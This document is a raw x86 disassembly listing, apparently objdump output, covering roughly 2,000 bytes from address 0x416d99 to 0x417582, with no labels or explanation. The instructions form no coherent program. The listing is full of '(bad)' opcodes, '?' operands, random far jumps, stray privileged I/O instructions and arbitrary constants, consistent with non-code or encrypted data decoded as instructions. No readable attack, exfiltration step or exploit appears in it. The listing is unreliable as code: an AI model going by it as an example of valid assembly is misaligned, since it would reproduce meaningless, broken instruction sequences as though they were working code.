  416d99:	push   esi
  416d9a:	push   esp
  416d9b:	sub    esp,DWORD PTR [edi+esi*4]
  416d9e:	fimul  DWORD PTR [ebp-0x3ad447b3]
  416da4:	mov    edi,edx
  416da6:	push   ss
  416da7:	addr16 imul edi,ebx,0x32295f52
  416dae:	add    DWORD PTR [esi-0x1725762b],edi
  416db4:	fdivr  DWORD PTR [ebx]
  416db6:	retf   
  416db7:	sbb    bl,bh
  416db9:	imul   esp,DWORD PTR ds:0xfb6440be,0xa6f3f78
  416dc3:	fistp  DWORD PTR [ecx+0x7dbd568]
  416dc9:	adc    eax,0x2adc6fca
  416dce:	jne    0x416d8f
  416dd0:	cwde   
  416dd1:	mov    ebp,0xf7587a1
  416dd6:	lods   eax,DWORD PTR ds:[esi]
  416dd7:	std    
  416dd8:	retf   
  416dd9:	xor    al,0x1e
  416ddb:	mov    edx,0x2e2db886
  416de0:	xor    al,0x51
  416de2:	lods   eax,DWORD PTR ds:[esi]
  416de3:	mov    eax,0x99fb2a2d
  416de8:	sbb    eax,edi
  416dea:	rcl    edx,cl
  416dec:	out    dx,al
  416ded:	ficom  WORD PTR [ecx-0x6fab3308]
  416df3:	mov    ah,0x98
  416df5:	ja     0x416dcc
  416df7:	sahf   
  416df8:	pop    ds
  416df9:	dec    esi
  416dfa:	push   0xfffffffa
  416dfc:	mov    edi,0x196b171e
  416e01:	push   ebx
  416e02:	in     eax,dx
  416e03:	jmp    0xd547:0xe84b7de7
  416e0a:	imul   ebp,eax,0xbc800cfc
  416e10:	loop   0x416de7
  416e12:	pop    es
  416e13:	(bad)  
  416e14:	adc    al,ah
  416e16:	fwait
  416e17:	jno    0x416db1
  416e19:	adc    BYTE PTR [edi],0x1f
  416e1c:	mov    dl,0x2a
  416e1e:	ja     0x416e6e
  416e20:	scas   eax,DWORD PTR es:[edi]
  416e21:	adc    eax,0x1ea94ecc
  416e26:	dec    eax
  416e27:	inc    ebx
  416e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e29:	add    al,0x97
  416e2b:	and    eax,DWORD PTR [ebx-0x1d]
  416e2e:	mov    eax,0x22f99b10
  416e33:	ret    
  416e34:	mov    BYTE PTR [edx+0x23],0x55
  416e38:	lods   eax,DWORD PTR ds:[esi]
  416e39:	pop    ss
  416e3a:	mov    ebx,0x98b8816e
  416e3f:	xor    al,0xd3
  416e41:	into   
  416e42:	daa    
  416e43:	add    eax,0x3a8ad440
  416e48:	sti    
  416e49:	xor    esp,DWORD PTR fs:[esi-0x4f]
  416e4d:	outs   dx,BYTE PTR ds:[esi]
  416e4e:	pop    ss
  416e4f:	loopne 0x416dfa
  416e51:	test   al,0x27
  416e53:	push   cs
  416e54:	dec    ebx
  416e55:	mov    bh,0x54
  416e57:	sub    esi,DWORD PTR [ebp+0x42]
  416e5a:	psrld  mm4,QWORD PTR [ecx]
  416e5d:	jg     0x416e4d
  416e5f:	in     eax,0x2b
  416e61:	xchg   ebp,ebp
  416e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e64:	sar    cl,cl
  416e66:	mov    cs,WORD PTR [edx+0x30]
  416e69:	retf   0x35b1
  416e6c:	daa    
  416e6d:	inc    ebx
  416e6e:	stos   BYTE PTR es:[edi],al
  416e6f:	pop    ecx
  416e70:	inc    DWORD PTR [ebx+0x1c]
  416e73:	fimul  DWORD PTR [edi+0x5e7777f4]
  416e79:	ss leave 
  416e7b:	cmp    DWORD PTR [eax+ebx*1-0x34],ebp
  416e7f:	xchg   ebp,eax
  416e80:	push   ebp
  416e81:	(bad)  
  416e82:	mov    edi,DWORD PTR [ebp-0x19]
  416e85:	xchg   ebp,eax
  416e86:	shl    BYTE PTR [eax],0xd4
  416e89:	repz das 
  416e8b:	cmp    ecx,DWORD PTR [eax+ebx*4-0x2f]
  416e8f:	outs   dx,DWORD PTR ds:[esi]
  416e90:	pop    edi
  416e91:	enter  0x4afd,0x7e
  416e95:	cmp    eax,0x9343ca6
  416e9a:	or     eax,0xec041adc
  416e9f:	daa    
  416ea0:	bound  eax,QWORD PTR [ecx+0x18]
  416ea3:	pop    ecx
  416ea4:	adc    eax,0x7a0277
  416ea9:	pop    ecx
  416eaa:	jae    0x416e2e
  416eac:	aaa    
  416ead:	dec    ecx
  416eae:	and    eax,0xa3c31c2b
  416eb3:	std    
  416eb4:	push   edi
  416eb5:	fsub   DWORD PTR [ebx]
  416eb7:	inc    DWORD PTR [edi]
  416eb9:	cdq    
  416eba:	xchg   ebp,eax
  416ebb:	inc    esi
  416ebc:	(bad)  [esi-0x48]
  416ebf:	dec    BYTE PTR [ecx+eax*2+0x6e]
  416ec3:	jno    0x416eee
  416ec5:	mov    ch,0x7a
  416ec7:	js     0x416f3a
  416ec9:	xchg   ebx,eax
  416eca:	xlat   BYTE PTR ds:[ebx]
  416ecb:	dec    ah
  416ecd:	pop    es
  416ece:	mov    bh,0xf2
  416ed0:	cmp    DWORD PTR [ebx-0x4daff55d],0x68
  416ed7:	jns    0x416e5f
  416ed9:	sti    
  416eda:	fucom  st(6)
  416edc:	dec    ecx
  416edd:	dec    ebx
  416ede:	in     al,0x34
  416ee0:	mov    edi,?
  416ee2:	loop   0x416eae
  416ee4:	xchg   edi,eax
  416ee5:	ret    0xe215
  416ee8:	mov    ebx,0xa53696e0
  416eed:	jge    0x416ef7
  416eef:	dec    BYTE PTR [edi-0x46a2c847]
  416ef5:	(bad)  
  416ef6:	fidivr WORD PTR [bp+si-0x10]
  416efa:	out    0x10,eax
  416efc:	or     DWORD PTR [esi-0x24255576],edx
  416f02:	les    esp,FWORD PTR [ebp+eiz*2+0x21c1ae5a]
  416f09:	pop    ebx
  416f0a:	stos   DWORD PTR es:[edi],eax
  416f0b:	scas   al,BYTE PTR es:[edi]
  416f0c:	pop    ss
  416f0d:	mov    bh,0x83
  416f0f:	push   ds
  416f10:	pusha  
  416f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f12:	inc    ebp
  416f13:	jmp    0x416f7e
  416f15:	mov    cs,WORD PTR [esi]
  416f17:	pop    ebp
  416f18:	clc    
  416f19:	pushf  
  416f1a:	(bad)  
  416f1c:	sbb    bl,BYTE PTR [edi]
  416f1e:	jecxz  0x416f80
  416f20:	add    al,0x7c
  416f22:	or     eax,0xb0d7ee07
  416f27:	es out 0x97,eax
  416f2a:	sub    BYTE PTR [ebx],cl
  416f2c:	inc    edx
  416f2d:	cmp    cl,dh
  416f2f:	xor    edi,ebx
  416f31:	jp     0x416f2e
  416f33:	push   ss
  416f34:	adc    BYTE PTR [esp+esi*2],0x23
  416f38:	inc    ebp
  416f39:	mov    ebx,0x9ca60794
  416f3e:	mov    bh,0xcb
  416f40:	push   es
  416f41:	repz mov ds:0x91f333dd,eax
  416f47:	fist   DWORD PTR [edx-0x3f]
  416f4a:	add    al,0x43
  416f4c:	jo     0x416f7b
  416f4e:	mov    dh,0x8b
  416f51:	stc    
  416f52:	adc    DWORD PTR [esi],0x7049de4e
  416f58:	xchg   edi,eax
  416f59:	std    
  416f5a:	icebp  
  416f5b:	jmp    0x72bf96b7
  416f60:	test   cl,bh
  416f62:	and    BYTE PTR [edi],0xb5
  416f65:	jg     0x416f8d
  416f67:	(bad)  
  416f68:	mov    eax,0x73579345
  416f6d:	and    eax,0x71ee5cf7
  416f72:	arpl   WORD PTR [edx],sp
  416f74:	ins    BYTE PTR es:[edi],dx
  416f75:	fsub   QWORD PTR [ebx+0x3cbc67fa]
  416f7b:	inc    esp
  416f7c:	cmc    
  416f7d:	jb     0x416f9a
  416f7f:	mov    bl,0xc9
  416f81:	mov    edx,0x6b0fe05d
  416f86:	sub    DWORD PTR [ebp+eax*4+0x60ba01ff],esp
  416f8d:	xor    esi,DWORD PTR ds:[eax-0x43]
  416f91:	xchg   ebp,eax
  416f92:	rcr    ebp,0x4d
  416f95:	add    cl,ah
  416f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f98:	xchg   ebx,eax
  416f99:	or     eax,0xccc9e052
  416f9e:	and    eax,DWORD PTR [ebp+0x69]
  416fa1:	mov    dh,0xdf
  416fa3:	mov    cl,0xb9
  416fa5:	(bad)  
  416fa6:	mov    cl,0x22
  416fa8:	or     eax,0x5b23c982
  416fad:	jbe    0x416fda
  416faf:	aad    0xf
  416fb1:	push   ecx
  416fb2:	lds    esi,FWORD PTR [edi+0xde2ed1b]
  416fb8:	lea    esp,[esi-0x5457ade4]
  416fbe:	loopne 0x417032
  416fc0:	dec    eax
  416fc1:	into   
  416fc2:	mov    DWORD PTR [esi],edx
  416fc4:	add    bl,BYTE PTR [esi+0x5c1cdbef]
  416fca:	pop    es
  416fcb:	adc    dh,BYTE PTR [ebx-0x4ab37ea1]
  416fd1:	add    ebp,ebx
  416fd3:	(bad)  
  416fd4:	out    0xaf,eax
  416fd6:	sub    al,0x1
  416fd8:	jbe    0x416ff3
  416fda:	jecxz  0x416f9a
  416fdc:	int    0xaa
  416fde:	push   edx
  416fdf:	lods   al,BYTE PTR ds:[esi]
  416fe0:	xchg   esp,eax
  416fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe2:	jne    0x416f78
  416fe4:	sti    
  416fe5:	push   0x2fd702d8
  416fea:	xchg   edi,eax
  416feb:	outs   dx,BYTE PTR ds:[esi]
  416fec:	xchg   BYTE PTR [eax-0x7d],al
  416fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ff0:	into   
  416ff1:	pop    es
  416ff2:	adc    BYTE PTR [esi+ecx*8+0x11],dl
  416ff6:	sub    al,0x8e
  416ff8:	jl     0x416f9b
  416ffa:	cmp    BYTE PTR [edx+0x33],al
  416ffd:	fisubr DWORD PTR [edi]
  416fff:	je     0x41704c
  417001:	je     0x417009
  417003:	mov    al,ds:0x714d48cc
  417008:	sti    
  417009:	jmp    0xbead:0x8efe9ab0
  417010:	and    al,0x6d
  417012:	mov    esi,0x1001c942
  417017:	sbb    al,0xc
  417019:	mov    ah,0xdd
  41701b:	mov    ebx,0x6e0977e
  417020:	les    ecx,FWORD PTR [ebp+0x35814eff]
  417026:	cmp    DWORD PTR [ebx-0x52],0xd249fbc0
  41702d:	inc    esi
  41702e:	test   DWORD PTR [eax+0x6a],0x739d3b79
  417035:	adc    BYTE PTR [edx*1-0x2c251410],bh
  41703c:	or     ecx,ebp
  41703e:	adc    ecx,DWORD PTR [eax]
  417040:	or     dl,BYTE PTR [ebx]
  417042:	nop
  417043:	mov    ecx,0x878437ad
  417048:	or     BYTE PTR ds:0x40829e0e,0x43
  41704f:	mov    bh,0xbe
  417051:	xlat   BYTE PTR ds:[ebx]
  417052:	jg     0x416ffc
  417054:	or     al,0x41
  417056:	push   esp
  417057:	cmp    BYTE PTR [eax],bh
  417059:	out    dx,al
  41705a:	jle    0x4170bc
  41705c:	retf   
  41705d:	push   0x51
  41705f:	push   cs
  417060:	(bad)  
  417061:	pop    edx
  417062:	repnz xor ebp,DWORD PTR [esi-0x22]
  417066:	das    
  417067:	xchg   edi,eax
  417068:	rol    al,1
  41706a:	cli    
  41706b:	test   DWORD PTR [ebx+0x481b380],ecx
  417071:	xchg   esp,eax
  417072:	out    dx,eax
  417073:	xor    DWORD PTR [ebp-0x7e],0x782384cb
  41707a:	push   DWORD PTR [ecx-0x43a2515f]
  417080:	mov    eax,0x4773fc1e
  417085:	mov    ?,WORD PTR [ebx-0x25]
  417088:	jne    0x4170c7
  41708a:	dec    eax
  41708b:	call   0x68bb1f9a
  417090:	mov    ebx,ecx
  417092:	inc    ebp
  417093:	sub    ecx,DWORD PTR [edx-0x1b319562]
  417099:	cmp    al,0x25
  41709b:	pop    edi
  41709c:	sbb    ebp,DWORD PTR [ecx-0x52906c35]
  4170a2:	rcr    BYTE PTR [ebx],1
  4170a4:	pop    esi
  4170a5:	popf   
  4170a6:	leave  
  4170a7:	xchg   esi,eax
  4170a8:	xor    ebx,DWORD PTR [edi-0x3d1b96ff]
  4170ae:	icebp  
  4170af:	aaa    
  4170b0:	jmp    0x41711b
  4170b2:	pop    ecx
  4170b3:	pusha  
  4170b4:	aam    0x6d
  4170b6:	div    BYTE PTR [edi]
  4170b8:	mov    esi,0x1d1c5459
  4170bd:	shl    DWORD PTR [ebx-0x23a00cab],1
  4170c3:	add    esp,esi
  4170c5:	dec    ecx
  4170c6:	mov    ds:0xb516348c,al
  4170cb:	fild   DWORD PTR [esi+0x16]
  4170ce:	adc    ebp,edx
  4170d0:	ja     0x417065
  4170d2:	lods   eax,DWORD PTR ds:[esi]
  4170d3:	xor    al,0x6d
  4170d5:	stos   DWORD PTR es:[edi],eax
  4170d6:	test   DWORD PTR [ebx],ebp
  4170d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d9:	adc    BYTE PTR [bx-0xb3e],cl
  4170de:	shl    ecx,0x27
  4170e1:	sbb    al,0xa9
  4170e3:	std    
  4170e4:	mov    dl,cl
  4170e6:	xchg   esp,eax
  4170e7:	xor    eax,0xc70ab912
  4170ec:	lock pop edx
  4170ee:	pop    es
  4170ef:	mov    BYTE PTR [esi+0x2325eb38],bl
  4170f5:	cli    
  4170f6:	and    esp,DWORD PTR [edx+0x7b001369]
  4170fc:	dec    ecx
  4170fd:	xchg   dh,cl
  4170ff:	int3   
  417100:	xchg   esi,eax
  417101:	jo     0x41712c
  417103:	jno    0x4170ad
  417105:	dec    eax
  417106:	lds    edx,FWORD PTR [esi]
  417108:	mov    fs,WORD PTR [edx+ecx*1-0x435273b0]
  41710f:	add    eax,0x9a7214a6
  417114:	push   0x3f451b5
  417119:	pop    edi
  41711a:	pop    ecx
  41711b:	(bad)  
  41711c:	(bad)  
  41711e:	xchg   BYTE PTR [ebp-0x491c65a4],al
  417124:	jp     0x41710a
  417126:	jns    0x4170d5
  417128:	fbstp  TBYTE PTR [ecx-0x39fc4231]
  41712e:	jb     0x4170d6
  417130:	push   edi
  417131:	jbe    0x417171
  417133:	mov    ecx,0x38eb8028
  417138:	fist   DWORD PTR [ecx-0x7edfe217]
  41713e:	or     eax,0x85264bb3
  417143:	mov    edi,es
  417145:	div    DWORD PTR [eax+0x6fbb7afb]
  41714b:	add    esi,ebp
  41714d:	push   eax
  41714e:	xor    eax,0x50a1f7ae
  417153:	mov    DWORD PTR [edi],ebp
  417155:	pop    ecx
  417156:	call   0xbe6fae19
  41715b:	dec    ebx
  41715c:	xchg   ebx,eax
  41715d:	ja     0x4171c0
  41715f:	push   0xf72775d1
  417164:	adc    cl,BYTE PTR [edx+ebp*2]
  417167:	sub    ch,bl
  417169:	add    eax,0xd1c39f09
  41716e:	iret   
  41716f:	inc    esi
  417170:	fld    TBYTE PTR [edi+0x53]
  417173:	adc    esi,ebp
  417175:	fdivr  QWORD PTR [edx]
  417177:	and    al,BYTE PTR [esp+edx*4+0x58a12836]
  41717e:	mov    al,0x99
  417180:	jmp    0xce9472af
  417185:	comiss xmm6,DWORD PTR ds:0x8a883f5b
  41718c:	jge    0x417142
  41718e:	mov    DWORD PTR [ebp+0x76],eax
  417191:	inc    ebx
  417192:	(bad)  
  417193:	xor    al,0x62
  417195:	mov    ebp,esp
  417197:	scas   eax,DWORD PTR es:[edi]
  417198:	fsub   st(0),st
  41719a:	lds    esp,FWORD PTR [ebp+0x48]
  41719d:	mov    al,0x7c
  41719f:	or     eax,ebp
  4171a1:	push   ebp
  4171a2:	ret    0x4401
  4171a5:	pusha  
  4171a6:	jg     0x417225
  4171a8:	add    dh,BYTE PTR [esi+0x3e980fd9]
  4171ae:	push   ecx
  4171af:	cmc    
  4171b0:	fs fs jae 0x417144
  4171b4:	movups XMMWORD PTR [bp-0x5ffe],xmm4
  4171ba:	dec    ebx
  4171bb:	pop    ebp
  4171bc:	test   DWORD PTR [edx-0x102fe206],esp
  4171c2:	aam    0x27
  4171c4:	arpl   WORD PTR [edx+0x7c73fefe],si
  4171ca:	mov    edx,0x7171968
  4171cf:	(bad)  
  4171d0:	fsubrp st(4),st
  4171d2:	ins    BYTE PTR es:[edi],dx
  4171d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171d4:	fnstsw WORD PTR [ebp+0x6]
  4171d7:	retf   0xbad0
  4171da:	mov    ecx,0x3d674ec6
  4171df:	lods   eax,DWORD PTR ds:[esi]
  4171e0:	pop    edi
  4171e1:	fwait
  4171e2:	sbb    ch,BYTE PTR [eax-0x17]
  4171e5:	add    eax,0xa3e4e743
  4171ea:	mov    WORD PTR [edi-0x13f41e7d],?
  4171f0:	adc    DWORD PTR [eax],0xfffffff2
  4171f3:	xchg   esi,eax
  4171f4:	shr    DWORD PTR [esi-0x33],0xed
  4171f8:	dec    esp
  4171f9:	fwait
  4171fa:	mov    edx,0xd7916f8b
  4171ff:	or     eax,0x22565ca9
  417204:	push   ss
  417205:	sbb    DWORD PTR [ebx+ebx*2-0x30b44cd4],eax
  41720c:	test   al,0x73
  41720e:	out    0xc6,al
  417210:	adc    al,0x70
  417212:	sbb    al,dl
  417214:	jo     0x4171e5
  417216:	mov    dh,0xb2
  417218:	mov    WORD PTR [ecx+0x46],ss
  41721b:	xchg   ebp,eax
  41721c:	gs sub eax,0xd5ea7aa6
  417222:	fadd   QWORD PTR ds:0x5d37f357
  417228:	in     al,0x28
  41722a:	inc    edi
  41722b:	shl    BYTE PTR ds:0x7ec4ae6c,1
  417231:	sbb    eax,0x60ce5202
  417236:	pop    ecx
  417237:	test   BYTE PTR [ebx-0x17],0xef
  41723b:	mov    esp,0x6b82781c
  417240:	mov    edx,0x5acc0d2f
  417245:	lods   eax,DWORD PTR ds:[esi]
  417246:	sbb    eax,0xe8929733
  41724b:	mov    dl,0x51
  41724d:	leave  
  41724e:	cmp    ecx,ecx
  417250:	jne    0x417210
  417252:	fdivr  QWORD PTR [edx-0x4914f697]
  417258:	repz lds eax,FWORD PTR [ebp-0x7ac4818a]
  41725f:	and    DWORD PTR [eax+eiz*4+0x63],ebx
  417263:	std    
  417264:	rcl    DWORD PTR [esi],cl
  417266:	(bad)  
  417267:	movups xmm6,XMMWORD PTR [ecx+0x71]
  41726b:	repz sbb DWORD PTR [edi-0x286dfd19],ecx
  417272:	aam    0xf4
  417274:	sar    BYTE PTR [ecx-0x2f],0xf8
  417278:	mov    edx,0xaee4393d
  41727d:	xchg   edx,eax
  41727e:	inc    esp
  41727f:	mov    ds:0xab83d3d7,al
  417284:	popf   
  417285:	cmp    bh,BYTE PTR [edx]
  417287:	or     bh,BYTE PTR [eax-0x119b7387]
  41728d:	and    BYTE PTR [esi+0x22],ch
  417290:	mov    ch,0xf1
  417292:	xchg   esi,eax
  417293:	dec    ebx
  417294:	out    dx,eax
  417295:	(bad)  
  417296:	repnz cmp al,0xe
  417299:	ds or  ah,cl
  41729c:	aaa    
  41729d:	dec    ebp
  41729e:	inc    ecx
  41729f:	mov    al,ds:0x88c3e739
  4172a4:	lahf   
  4172a5:	out    0xa1,al
  4172a7:	(bad)  
  4172a8:	mov    ds:0x8f3ca5b3,eax
  4172ad:	lds    ecx,FWORD PTR [ebp+0x20fbaec5]
  4172b3:	mov    DWORD PTR [edx-0x41],ebx
  4172b6:	mov    eax,ds:0x9c9b7150
  4172bb:	ror    BYTE PTR [ebx+0x25],1
  4172be:	js     0x417261
  4172c0:	sub    ch,al
  4172c2:	xor    esp,esi
  4172c4:	pop    ds
  4172c5:	shl    BYTE PTR [ecx-0x1dcd59ad],1
  4172cb:	lock out 0x63,al
  4172ce:	sub    BYTE PTR ss:[edx-0x3670d121],dl
  4172d5:	mov    ah,0xea
  4172d7:	mov    al,ds:0x56047e0c
  4172dc:	fcomi  st,st(4)
  4172de:	xor    BYTE PTR [ebx],al
  4172e0:	and    bl,BYTE PTR [edx-0x283e8bd0]
  4172e6:	add    ch,0x97
  4172e9:	fst    QWORD PTR [edi+0x7e5e244f]
  4172ef:	push   esi
  4172f0:	test   al,0x96
  4172f2:	ret    
  4172f3:	sub    esp,DWORD PTR [ebx]
  4172f5:	fsubr  QWORD PTR [ecx-0x1f]
  4172f8:	cmp    eax,0x8fe09b9
  4172fd:	jle    0x417305
  4172ff:	call   edi
  417301:	sar    esi,0xde
  417304:	popa   
  417305:	push   cs
  417306:	xchg   esi,eax
  417307:	pop    ss
  417308:	ins    BYTE PTR es:[edi],dx
  417309:	outs   dx,BYTE PTR ds:[esi]
  41730a:	mov    eax,0x207b92e3
  41730f:	(bad)  
  417310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417311:	mov    DWORD PTR [ebp+0x22],ebp
  417314:	js     0x417381
  417316:	jmp    0xe3b3:0x6cab2202
  41731d:	sub    al,0xc6
  41731f:	jp     0x417310
  417321:	hlt    
  417322:	mov    ds:0xca99a226,al
  417327:	nop
  417328:	mov    edi,0xb61b5691
  41732d:	(bad)  
  41732e:	pop    esp
  41732f:	nop
  417330:	mov    DWORD PTR [edi-0x5f4f414f],edi
  417336:	fiadd  WORD PTR [edx-0xdca0331]
  41733c:	xlat   BYTE PTR ds:[ebx]
  41733d:	ja     0x41731c
  41733f:	jmp    0xb1a3:0xa933f6d2
  417346:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417348:	push   es
  417349:	repz and BYTE PTR [edi+0x43ea07a3],ah
  417350:	out    0x65,al
  417352:	fsubr  st,st(3)
  417354:	add    dh,cl
  417356:	dec    ecx
  417357:	imul   esp,DWORD PTR gs:[ecx-0x67],0xe8f1d16b
  41735f:	and    al,0x4a
  417361:	dec    esp
  417362:	aas    
  417363:	pop    ebp
  417364:	sbb    al,0xdf
  417366:	xor    ebp,ebx
  417368:	arpl   WORD PTR [esp+edi*8-0x65],ax
  41736c:	xlat   BYTE PTR ds:[ebx]
  41736d:	iret   
  41736e:	and    BYTE PTR [edi+edx*4-0x3ead92f2],dl
  417375:	mov    dl,BYTE PTR [eax]
  417377:	jnp    0x417306
  417379:	mov    ds:0xb585c9e5,al
  41737e:	and    esi,DWORD PTR [eax+0x3f]
  417381:	outs   dx,BYTE PTR ds:[esi]
  417382:	rcl    edx,1
  417384:	dec    eax
  417385:	scas   eax,DWORD PTR es:[edi]
  417386:	(bad)  
  417387:	jmp    0x6c77:0xd8d30bff
  41738e:	and    ebp,DWORD PTR [edx+ebx*1+0x3d43abd4]
  417395:	mov    ah,0x48
  417397:	fcom   DWORD PTR [edi+0x6d]
  41739a:	in     al,0x5d
  41739c:	jbe    0x4173b2
  41739e:	inc    esp
  41739f:	inc    ebx
  4173a0:	js     0x41732e
  4173a2:	or     DWORD PTR [edx],eax
  4173a4:	iret   
  4173a5:	mov    al,ds:0x8213a6ca
  4173aa:	aaa    
  4173ab:	add    edi,DWORD PTR [ebp+0x34d01c1e]
  4173b1:	xor    DWORD PTR [ebx],edx
  4173b3:	xchg   edi,eax
  4173b4:	imul   BYTE PTR [ecx]
  4173b6:	shl    BYTE PTR [ebp-0x5129dd2d],0xec
  4173bd:	stos   DWORD PTR es:[edi],eax
  4173be:	dec    eax
  4173bf:	outs   dx,DWORD PTR ds:[esi]
  4173c0:	jae    0x41740d
  4173c2:	(bad)  
  4173c4:	cmp    al,0xc2
  4173c6:	mov    ch,0x85
  4173c8:	push   ebx
  4173c9:	or     al,0xef
  4173cb:	les    ebp,FWORD PTR [edx-0x4c]
  4173ce:	icebp  
  4173cf:	sbb    dh,BYTE PTR [ebp-0x7d]
  4173d2:	into   
  4173d3:	and    ah,BYTE PTR [edi+0x2c16f4f2]
  4173d9:	mov    dl,0x4c
  4173db:	xor    al,ch
  4173dd:	add    BYTE PTR [ebx-0x8],ch
  4173e0:	ins    BYTE PTR es:[edi],dx
  4173e1:	mov    bl,0x7f
  4173e3:	mov    ch,ah
  4173e5:	mov    BYTE PTR [edx],dl
  4173e7:	mov    cl,0xfc
  4173e9:	dec    edi
  4173ea:	mov    cl,0x8d
  4173ec:	out    dx,al
  4173ed:	(bad)  
  4173ef:	(bad)  
  4173f0:	(bad)  
  4173f1:	loope  0x41743e
  4173f3:	add    ebx,DWORD PTR [eax-0x6d]
  4173f6:	(bad)
  4173f9:	aam    0x9b
  4173fb:	cmp    bl,BYTE PTR [esi+0x54]
  4173fe:	aaa    
  4173ff:	sar    DWORD PTR [edx+0x29],cl
  417402:	mov    dh,0xd7
  417404:	jl     0x417482
  417406:	call   0x8e2543aa
  41740b:	daa    
  41740c:	xor    eax,0x42961ce1
  417411:	stc    
  417412:	xlat   BYTE PTR ds:[ebx]
  417413:	ds pop es
  417415:	ret    
  417416:	sbb    DWORD PTR [ebx+0x78],ebp
  417419:	jle    0x417412
  41741b:	lods   eax,DWORD PTR ds:[esi]
  41741c:	adc    bl,al
  41741e:	mov    esi,0x989a9ed
  417423:	xor    DWORD PTR [edx+0x78],ebx
  417426:	iret   
  417427:	push   0xdf36e2fc
  41742c:	jl     0x4173e4
  41742e:	mov    ax,fs:0xe9b4f82e
  417435:	sbb    al,0xb5
  417437:	cmp    ebp,DWORD PTR [ebx-0x7530f158]
  41743d:	outs   dx,BYTE PTR ds:[esi]
  41743e:	mov    fs,eax
  417440:	mov    ebp,0x34a34124
  417445:	push   ebx
  417446:	popa   
  417447:	into   
  417448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417449:	dec    ecx
  41744a:	pop    ds
  41744b:	adc    ebx,DWORD PTR [ecx+0x226e45b2]
  417451:	in     eax,0x29
  417453:	loope  0x41747c
  417455:	loope  0x417455
  417457:	sbb    BYTE PTR [eax],ch
  417459:	icebp  
  41745a:	xor    eax,0x15239133
  41745f:	push   0xed0325bf
  417464:	fcomp  DWORD PTR [eax-0xe72cf16]
  41746a:	test   al,0x7b
  41746c:	xor    bl,BYTE PTR [eax-0x17]
  41746f:	add    DWORD PTR [eax+0x8],ebx
  417472:	(bad)  
  417473:	or     ch,BYTE PTR [edx]
  417475:	leave  
  417476:	hlt    
  417477:	cmp    BYTE PTR ds:0x985a28d1,cl
  41747d:	fnstenv [eax]
  41747f:	pop    ebx
  417480:	xlat   BYTE PTR ds:[ebx]
  417481:	js     0x417434
  417483:	lods   eax,DWORD PTR ds:[esi]
  417484:	or     BYTE PTR [ebp-0x8020141],dl
  41748a:	jmp    0x4174a8
  41748c:	jae    0x4174c1
  41748e:	stos   DWORD PTR es:[edi],eax
  41748f:	adc    esp,DWORD PTR [edi]
  417491:	sub    DWORD PTR [edx-0x5ecd5285],esi
  417497:	mov    ecx,0xe2e570f7
  41749c:	scas   al,BYTE PTR es:[edi]
  41749d:	push   ebx
  41749e:	xchg   ecx,eax
  41749f:	fstp   QWORD PTR [edi+0x33e4c90d]
  4174a5:	test   eax,0xdd755133
  4174aa:	push   edx
  4174ab:	loop   0x4174e1
  4174ad:	call   0x505c:0xe01252c7
  4174b4:	push   esi
  4174b5:	xor    eax,0xded1e942
  4174ba:	or     BYTE PTR [ebx+0x64],al
  4174bd:	(bad)  
  4174be:	mov    ah,0xdf
  4174c0:	sti    
  4174c1:	ficomp DWORD PTR [esi+0x52]
  4174c4:	outs   dx,BYTE PTR ds:[esi]
  4174c5:	in     al,0xe1
  4174c7:	ja     0x4174f3
  4174c9:	int    0x3a
  4174cb:	mov    bh,0x7b
  4174cd:	ja     0x417460
  4174cf:	jecxz  0x4174ef
  4174d1:	mov    WORD PTR [ecx+0x1037c566],cs
  4174d7:	mov    eax,0xaa0f6cef
  4174dc:	lock sub dh,BYTE PTR [eax-0x2d]
  4174e0:	add    ebx,edx
  4174e2:	push   ebp
  4174e3:	add    al,0xb4
  4174e5:	icebp  
  4174e6:	xor    DWORD PTR ss:[ecx],esi
  4174e9:	jge    0x417497
  4174eb:	push   ecx
  4174ec:	pop    ecx
  4174ed:	retf   0x58e5
  4174f0:	pop    ecx
  4174f1:	cmp    bh,ah
  4174f3:	retf   0x552d
  4174f6:	sbb    dl,BYTE PTR [ebp-0x640f8a6]
  4174fc:	setb   bh
  4174ff:	sar    BYTE PTR [esi],1
  417501:	inc    ebp
  417502:	dec    esp
  417503:	adc    cl,BYTE PTR [edi]
  417505:	shl    cl,1
  417507:	outs   dx,BYTE PTR ds:[esi]
  417508:	jle    0x41750d
  41750a:	mov    WORD PTR [ecx+0x6],?
  41750d:	add    al,0x81
  41750f:	mov    ecx,0xedea5554
  417514:	repz aam 0x5f
  417517:	jp     0x4174da
  417519:	pcmpeqd mm4,QWORD PTR [eax-0x2464eaab]
  417520:	pop    edx
  417521:	mov    bl,0x2f
  417523:	pop    edx
  417524:	xor    eax,0xb0375486
  417529:	pop    eax
  41752a:	inc    ebx
  41752b:	mov    edi,0x4ed88b89
  417530:	cmp    eax,0x8f73fa3f
  417535:	(bad)  
  417536:	cmp    BYTE PTR [eax+0x68ee5309],al
  41753c:	ja     0x4174d8
  41753e:	sbb    al,0x74
  417540:	mov    eax,0xfdcd48e0
  417545:	lods   al,BYTE PTR ds:[esi]
  417546:	mov    ?,WORD PTR [ebx]
  417548:	sbb    eax,0xbc1db880
  41754d:	pop    edi
  41754e:	add    BYTE PTR [ebx+0x3],dh
  417551:	clc    
  417552:	xchg   edi,eax
  417553:	mov    esi,0xba920b0d
  417558:	cmp    esi,DWORD PTR [edx+0x553f237f]
  41755e:	pusha  
  41755f:	(bad)  
  417560:	mov    ebx,DWORD PTR [edi]
  417562:	popf   
  417563:	jmp    0x4175c8
  417565:	and    al,al
  417567:	mov    ebp,0xfa289d0a
  41756c:	into   
  41756d:	fcom   st(2)
  41756f:	or     al,0xd
  417571:	jge    0x4175e3
  417573:	sub    dh,0x4b
  417576:	lods   eax,DWORD PTR ds:[esi]
  417577:	xchg   edi,eax
  417578:	jmp    0x4174ff
  41757a:	test   eax,0x7d5bfe24
  41757f:	scas   eax,DWORD PTR es:[edi]
  417580:	jo     0x41751e
  417582:	dec    edi
